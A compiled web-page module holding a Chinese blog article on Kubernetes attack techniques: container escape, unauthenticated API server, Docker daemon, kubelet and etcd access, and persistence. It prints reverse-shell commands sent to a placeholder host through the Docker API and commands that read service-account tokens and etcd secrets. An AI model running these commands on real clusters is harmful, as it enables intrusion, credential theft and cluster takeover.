import{_ as i}from"./plugin-vue_export-helper-DlAUqK2U.js";import{c as a,a as s,o as n}from"./app-DS0ZCcmM.js";const t={};function l(r,e){return n(),a("div",null,e[0]||(e[0]=[s(`<h1 id="k8s漏洞" tabindex="-1"><a class="header-anchor" href="#k8s漏洞"><span>K8S漏洞</span></a></h1><h2 id="逃逸" tabindex="-1"><a class="header-anchor" href="#逃逸"><span>逃逸</span></a></h2><h3 id="挂载-var-log逃逸" tabindex="-1"><a class="header-anchor" href="#挂载-var-log逃逸"><span>挂载/var/log逃逸</span></a></h3><p>利用条件</p><ul><li>挂载了/var/log</li><li>容器是在一个 k8s 的环境中</li><li>当前 pod 的 serviceaccount 拥有 get|list|watch log 的权</li></ul><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>kubectl exec -it escaper /bin/bash</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>检测当前环境是否存在漏洞</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>find / -name lastlog 2&gt;/dev/null | wc -l | grep -q 3 &amp;&amp; echo &quot;/var/log is mounted.&quot; || echo &quot;/var/log is not mounted.&quot;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240312212439573.png" alt="image-20240312212439573" tabindex="0" loading="lazy"><figcaption>image-20240312212439573</figcaption></figure><p>创建软链接，访问宿主机文件</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>cd /var/log/host</span></span>
<span class="line"><span>ln -s / ./root_link</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240312212630215.png" alt="image-20240312212630215" tabindex="0" loading="lazy"><figcaption>image-20240312212630215</figcaption></figure><blockquote><p>想要反弹shell需要对挂载目录具有可写权限</p></blockquote><p>kubelet在node上启动一个文件服务器提供日志查询服务，目录为<code>/var/log</code>，查询api为<code>/logs</code>。</p><p>kubelet查询相应pod的日志，实际是访问<code>/var/log/</code>目录下对应容器目录下的<code>0.log</code>文件，该文件本质上是一个符号链接，目标日志文件在<code>/var/lib/docker/containers</code>目录下</p><p>kubelet查看日志文件支持文符号链接。如果容器内挂载了主机<code>/var/log</code>目录，可以通过在容器内创建符号链接到<code>/</code>,再利用<code>/logs</code>可以访问node主机上的任意文件，造成pod逃逸问题</p><h3 id="利用service-account连接api-server执行指令" tabindex="-1"><a class="header-anchor" href="#利用service-account连接api-server执行指令"><span>利用Service Account连接API Server执行指令</span></a></h3><p>高权限的serviceaccount可以连接apiserver来执行命令，如果获取到的pod使用高权限的service account,我们就可以连接api来执行命令</p><h2 id="初期访问" tabindex="-1"><a class="header-anchor" href="#初期访问"><span>初期访问</span></a></h2><h3 id="云ak泄露" tabindex="-1"><a class="header-anchor" href="#云ak泄露"><span>云AK泄露</span></a></h3><p>accesskey-可以理解为在集群当中进行鉴权使用</p><p>如果泄露了可以用来登录控制台，进行shell反弹的操作等</p><h3 id="api-server未授权" tabindex="-1"><a class="header-anchor" href="#api-server未授权"><span>API-server未授权</span></a></h3><p>k8s集群通过API来进行集群的控制，API-Server则提供了这个功能，通过控制API-server，我们可以通过创建任意的pod进行卷挂载来拿下node.</p><p>api-server分为两个端口</p><p>8080 - insecure-port,开启这个端口时.api-server不需要鉴权，可以进行任意的访问</p><p>6443 - secure-port ,这个端口用于api-server的正常服务活动</p><p>8080端口利用条件较为苛刻，需要通过满足低版本和暴露端口，6443我们通常利用其配置错误</p><h4 id="secure-port配置错误" tabindex="-1"><a class="header-anchor" href="#secure-port配置错误"><span>secure-port配置错误</span></a></h4><p>当我们不使用凭证去访问api-server时，服务器会将我们标记为system:anonymous用户，这个用户的权限是非常低的，但当管理员出现配置错误，将该用户绑定到一个高权限用户组，就导致我们利用api-server</p><div class="language-yaml line-numbers-mode" data-highlighter="shiki" data-ext="yaml" data-title="yaml" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#amin-bind.yaml</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">apiVersion</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">rbac.authorization.k8s.io/v1</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">kind</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">ClusterRoleBinding</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">metadata</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">  name</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">custom-cluster-admin-binding</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">subjects</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">- </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">kind</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">User</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">  name</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;system:anonymous&quot;</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">  apiGroup</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">rbac.authorization.k8s.io</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">roleRef</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">  kind</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">ClusterRole</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">  name</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">cluster-admin</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">  apiGroup</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">rbac.authorization.k8s.io</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240401173307234.png" alt="image-20240401173307234" tabindex="0" loading="lazy"><figcaption>image-20240401173307234</figcaption></figure><h3 id="configfile泄露" tabindex="-1"><a class="header-anchor" href="#configfile泄露"><span>configfile泄露</span></a></h3><p>k8s configfile配置文件中可能会有api-server登陆凭证等敏感信息</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240402104305241.png" alt="image-20240402104305241" tabindex="0" loading="lazy"><figcaption>image-20240402104305241</figcaption></figure><h3 id="利用docker-sock" tabindex="-1"><a class="header-anchor" href="#利用docker-sock"><span>利用docker.sock</span></a></h3><p>Docker daemon通过docker.sock这个文件去管理docker容器，Docker daemon也可以通过配置将docker.sock暴露在端口上，一般情况下2375端口用于未认证的HTTP通信，2376用于可信的HTTPS通信。</p><h4 id="公网暴露的docker-daemon" tabindex="-1"><a class="header-anchor" href="#公网暴露的docker-daemon"><span>公网暴露的docker daemon</span></a></h4><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>server=&quot;Docker&quot; &amp;&amp; port=&quot;2375&quot;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240402110025470.png" alt="image-20240402110025470" tabindex="0" loading="lazy"><figcaption>image-20240402110025470</figcaption></figure><p>此后我们可以通过docker.sock来执行命令</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>curl -X POST &quot;http://ip:2375/containers/{container_id}/exec&quot; -H &quot;Content-Type: application/json&quot; --data-binary &#39;{&quot;Cmd&quot;: [&quot;bash&quot;, &quot;-c&quot;, &quot;bash -i &gt;&amp; /dev/tcp/xxxx/1234 0&gt;&amp;1&quot;]}&#39;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h4 id="利用现成的docker-sock" tabindex="-1"><a class="header-anchor" href="#利用现成的docker-sock"><span>利用现成的docker.sock</span></a></h4><p>通常是在容器中挂载了/var/run/docker.sock</p><p>利用这一点我们可以完成容器逃逸操作</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>curl -s --unix-socket /var/run/docker.sock -X POST &quot;http://docker_daemon_ip/containers/{container_id}/exec&quot; -H &quot;Content-Type: application/json&quot; --data-binary &#39;{&quot;Cmd&quot;: [&quot;bash&quot;, &quot;-c&quot;, &quot;bash -i &gt;&amp; /dev/tcp/xxxx/1234 0&gt;&amp;1&quot;]}&#39;</span></span>
<span class="line"><span></span></span>
<span class="line"><span>curl -s --unix-socket /var/run/docker.sock -X POST &quot;http://docker_daemon_ip/exec/{id}/start&quot; -H &quot;Content-Type: application/json&quot; --data-binary &quot;{}&quot;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="kubelet未授权" tabindex="-1"><a class="header-anchor" href="#kubelet未授权"><span>kubelet未授权</span></a></h3><p>kubectl位于master节点，在对node上的pod进行操作时，会先和node上的kubelet进行联系，再通过kubelet进行操作</p><p>kubelet对应的API端口默认在10250，运行在集群中每台Node上，kubelet 的配置文件在node上的/var/lib/kubelet/config.yaml</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240402114235584.png" alt="image-20240402114235584" tabindex="0" loading="lazy"><figcaption>image-20240402114235584</figcaption></figure><p>第一个参数代表是否允许匿名访问，第二参数则是用于访问控制</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>关于authorization-mode还有以下的配置</span></span>
<span class="line"><span>--authorization-mode=ABAC 基于属性的访问控制（ABAC）模式允许你 使用本地文件配置策略。</span></span>
<span class="line"><span>--authorization-mode=RBAC 基于角色的访问控制（RBAC）模式允许你使用 Kubernetes API 创建和存储策略。</span></span>
<span class="line"><span>--authorization-mode=Webhook WebHook 是一种 HTTP 回调模式，允许你使用远程 REST 端点管理鉴权。</span></span>
<span class="line"><span>--authorization-mode=Node 节点鉴权是一种特殊用途的鉴权模式，专门对 kubelet 发出的 API 请求执行鉴权。</span></span>
<span class="line"><span>--authorization-mode=AlwaysDeny 该标志阻止所有请求。仅将此标志用于测试。</span></span>
<span class="line"><span>--authorization-mode=AlwaysAllow 此标志允许所有请求。仅在你不需要 API 请求 的鉴权时才使用此标志。</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>将配置文件中，authentication-anonymous-enabled改为true，authorization-mode改为AlwaysAllow，再使用命令systemctl restart kubelet 重启kubelet，那么就可以实现kubelet未授权访问</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240402115435300.png" alt="image-20240402115435300" tabindex="0" loading="lazy"><figcaption>image-20240402115435300</figcaption></figure><ul><li><p>在pod内执行命令</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>curl -XPOST -k https://node_ip:10250/run/&lt;namespace&gt;/&lt;PodName&gt;/&lt;containerName&gt; -d &quot;cmd=command&quot;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div></li><li><p>获取容器内service account凭据</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>curl -XPOST -k https://node_ip:10250/run/&lt;namespace&gt;/&lt;PodName&gt;/&lt;containerName&gt; -d &quot;cmd=cat /var/run/secrets/kubernets.io/serviceaccount/token&quot;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div></li></ul><h3 id="etcd未授权" tabindex="-1"><a class="header-anchor" href="#etcd未授权"><span>etcd未授权</span></a></h3><p>etcd是k8s中的数据库组件，用来存储集群中的token等资源，服务默认部署在2379端口，如果该端口存在未授权就可以通过etcd查询集群内管理员的token，然后用这个token访问api server接管集群。</p><p>需要注意的是k8s使用的etcd是v3版本</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>etcdctl --endpoints=https://etcd_ip:2375/ get / --prefix --keys-only | grep /secrets/</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h2 id="权限维持" tabindex="-1"><a class="header-anchor" href="#权限维持"><span>权限维持</span></a></h2><p>权限维持和linux思路差不多，这里主要讲讲云上集群中特殊的维权方式</p><h3 id="镜像投毒" tabindex="-1"><a class="header-anchor" href="#镜像投毒"><span>镜像投毒</span></a></h3><p>接管对方的私有镜像库，并对其中的镜像添加恶意操作行为，例如对dockerfile添加shell连接的操作.或者编辑镜像的文件层代码，将镜像中原始的可执行文件或链接库文件替换为精心构造的后门文件之后再次打包成新的镜像。</p><h3 id="修改组件的授权访问" tabindex="-1"><a class="header-anchor" href="#修改组件的授权访问"><span>修改组件的授权访问</span></a></h3><p>修改组件的访问权限，例如api-server,etcd,kubelet等，将其改为未授权状态，可以达到集群持久化的目的</p><h3 id="shadow-api-server" tabindex="-1"><a class="header-anchor" href="#shadow-api-server"><span>shadow api server</span></a></h3><p>部署一个额外的未授权且不记录日志的api server以供我们进行持久化。</p><p><a href="https://github.com/cdk-team/CDK/wiki/CDK-Home-CN" target="_blank" rel="noopener noreferrer">工具利用</a></p><h2 id="参考链接" tabindex="-1"><a class="header-anchor" href="#参考链接"><span>参考链接</span></a></h2><p><a href="https://tttang.com/archive/1465/#toc_shadow-api-servercdk" target="_blank" rel="noopener noreferrer">https://tttang.com/archive/1465/#toc_shadow-api-servercdk</a></p>`,70)]))}const c=i(t,[["render",l],["__file","k8s漏洞.html.vue"]]),p=JSON.parse('{"path":"/%E4%BA%91/K8S/k8s%E6%BC%8F%E6%B4%9E.html","title":"K8S漏洞","lang":"zh-CN","frontmatter":{"description":"K8S漏洞 逃逸 挂载/var/log逃逸 利用条件 挂载了/var/log 容器是在一个 k8s 的环境中 当前 pod 的 serviceaccount 拥有 get|list|watch log 的权 检测当前环境是否存在漏洞 image-20240312212439573image-20240312212439573 创建软链接，访问宿主机文件...","head":[["meta",{"property":"og:url","content":"https://mister-hope.github.io/articles/%E4%BA%91/K8S/k8s%E6%BC%8F%E6%B4%9E.html"}],["meta",{"property":"og:site_name","content":"uu2fu3o的知识库"}],["meta",{"property":"og:title","content":"K8S漏洞"}],["meta",{"property":"og:description","content":"K8S漏洞 逃逸 挂载/var/log逃逸 利用条件 挂载了/var/log 容器是在一个 k8s 的环境中 当前 pod 的 serviceaccount 拥有 get|list|watch log 的权 检测当前环境是否存在漏洞 image-20240312212439573image-20240312212439573 创建软链接，访问宿主机文件..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:image","content":"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240312212439573.png"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2025-01-15T18:41:02.000Z"}],["meta",{"property":"article:modified_time","content":"2025-01-15T18:41:02.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"K8S漏洞\\",\\"image\\":[\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240312212439573.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240312212630215.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240401173307234.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240402104305241.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240402110025470.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240402114235584.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240402115435300.png\\"],\\"dateModified\\":\\"2025-01-15T18:41:02.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"uu2fu3o\\",\\"url\\":\\"https://mister-hope.com\\"}]}"]]},"headers":[{"level":2,"title":"逃逸","slug":"逃逸","link":"#逃逸","children":[{"level":3,"title":"挂载/var/log逃逸","slug":"挂载-var-log逃逸","link":"#挂载-var-log逃逸","children":[]},{"level":3,"title":"利用Service Account连接API Server执行指令","slug":"利用service-account连接api-server执行指令","link":"#利用service-account连接api-server执行指令","children":[]}]},{"level":2,"title":"初期访问","slug":"初期访问","link":"#初期访问","children":[{"level":3,"title":"云AK泄露","slug":"云ak泄露","link":"#云ak泄露","children":[]},{"level":3,"title":"API-server未授权","slug":"api-server未授权","link":"#api-server未授权","children":[]},{"level":3,"title":"configfile泄露","slug":"configfile泄露","link":"#configfile泄露","children":[]},{"level":3,"title":"利用docker.sock","slug":"利用docker-sock","link":"#利用docker-sock","children":[]},{"level":3,"title":"kubelet未授权","slug":"kubelet未授权","link":"#kubelet未授权","children":[]},{"level":3,"title":"etcd未授权","slug":"etcd未授权","link":"#etcd未授权","children":[]}]},{"level":2,"title":"权限维持","slug":"权限维持","link":"#权限维持","children":[{"level":3,"title":"镜像投毒","slug":"镜像投毒","link":"#镜像投毒","children":[]},{"level":3,"title":"修改组件的授权访问","slug":"修改组件的授权访问","link":"#修改组件的授权访问","children":[]},{"level":3,"title":"shadow api server","slug":"shadow-api-server","link":"#shadow-api-server","children":[]}]},{"level":2,"title":"参考链接","slug":"参考链接","link":"#参考链接","children":[]}],"git":{"createdTime":1736966462000,"updatedTime":1736966462000,"contributors":[{"name":"uu2fu3o","username":"uu2fu3o","email":"1027578439@qq.com","commits":1,"url":"https://github.com/uu2fu3o"}]},"readingTime":{"minutes":5.21,"words":1564},"filePathRelative":"云/K8S/k8s漏洞.md","localizedDate":"2025年1月16日","excerpt":"\\n<h2>逃逸</h2>\\n<h3>挂载/var/log逃逸</h3>\\n<p>利用条件</p>\\n<ul>\\n<li>挂载了/var/log</li>\\n<li>容器是在一个 k8s 的环境中</li>\\n<li>当前 pod 的 serviceaccount 拥有 get|list|watch log 的权</li>\\n</ul>\\n<div class=\\"language- line-numbers-mode\\" data-highlighter=\\"shiki\\" data-ext=\\"\\" data-title=\\"\\" style=\\"--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34\\"><pre class=\\"shiki shiki-themes one-light one-dark-pro vp-code\\"><code><span class=\\"line\\"><span>kubectl exec -it escaper /bin/bash</span></span></code></pre>\\n<div class=\\"line-numbers\\" aria-hidden=\\"true\\" style=\\"counter-reset:line-number 0\\"><div class=\\"line-number\\"></div></div></div>","autoDesc":true}');export{c as comp,p as data};
